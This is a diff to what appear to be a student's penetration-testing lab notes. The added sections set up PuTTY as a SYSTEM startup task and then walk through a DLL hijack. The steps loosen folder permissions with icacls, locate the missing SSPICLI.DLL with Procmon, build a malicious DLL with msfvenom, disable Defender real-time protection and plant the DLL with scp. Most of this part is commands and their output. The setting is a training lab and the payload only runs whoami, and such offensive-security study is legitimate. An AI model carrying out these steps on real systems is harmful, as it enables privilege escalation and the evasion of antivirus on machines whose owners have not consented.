@@ -3279,6 +3279,11 @@ schtasks /query /fo LIST /v
 
 
 
+
+## Setting up PUTTY DEMO (CMD)
+
+DEMO SETUP PUTTY
+
 1. RDP to WINOPS and Download PUTTY http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
 
 2. Move into Program Files x86 and then create a service with Putty
@@ -3294,6 +3299,102 @@ Action -->
 Create Task 
 --> Name = Putty
 --> Triggers --> Begin the Task: At Startup
---> Action --> Stasrt a program
+--> Action --> Start a program --> C:\Putty\putty.exe
+--> Change User --> "System" (NT AUTHORITY\SYSTEM)
+okay
+
+
+## DLL HIGHKJACKING (CMD)
+
+1. Look for services with: (Services)
+No description
+Mispelled
+Look out of place
+
+
+2. Go to Location of file being ran in Service
+Verify if you can Write and create something within the directory
+
+IF NOT THE BELOW COMMAND GIVES WRITE PRIVILEGES
+```
+icacls 'c:\Program Files (x86)\Putty' /grant BUILTIN\Users:W
+
+PS C:\windows\system32> icacls 'C:\Program Files (x86)\Putty' /grant BUILTIN\Users:w                                    
+processed file: C:\Program Files (x86)\Putty                                                                            
+Successfully processed 1 files; Failed processing 0 files 
+```
+
+
+3. MAP Z: to sysinternals and Launch PROCMON to locate a DLL that isnt found running in the SAME DIR as putty
+```
+PS C:\windows\system32> net use Z: "\\http://live.sysinternals.com" /persistent:yes
+The command completed successfully. 
+
+cd Z:
+
+.\procmon.exe -accepteula
+```
+
+Procmon FILTERs
+
+Process Name CONTAINS --> putty.exe
+Path CONTAINS --> .dll
+Result IS --> NAME NOT FOUND 
+
+
+IF YOU NEED TO KILL AND RESTART
+(get-process | ?{$_.name -like "putty"}).kill()
+
+
+SSPICLI.DLL is the name not found in the same directory
+
+
+4. Create a payload to run using LINOPS that will be put in the spot where DLL was not FOUND
+
+msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > c:\Users\Student\Desktop\whoami.txt' -f dll > SSPICLI.dll
+
+```
+student@lin-ops:~$ msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > c:\Users\Student\Desktop\whoami.txt' -f dll > SSPICLI.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 242 bytes
+Final size of dll file: 8704 bytes
+
+```
+
+
+5. TURN OFF Windows Defender in order for this to work REAL TIME PROTECTION
+Run SCP on WINOPS to get the LINOPS Payload you just made to the Directory that is couldnt be found
+
+```
+scp student@10.50.37.42:/home/student/SSPICLI.dll "C:\Program Files (x86)\Putty"
+
+
+C:\Users\student>scp student@10.50.37.42:/home/student/SSPICLI.dll "C:\Program Files (x86)\Putty"
+student@10.50.37.42's password:
+SSPICLI.dll                                                                           100% 8704     8.5KB/s   00:00                                                                                                                C:\Users\student>
+```
+
+6. Run it and now the service will utilize the .dll that has now been replaced so it will be called
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
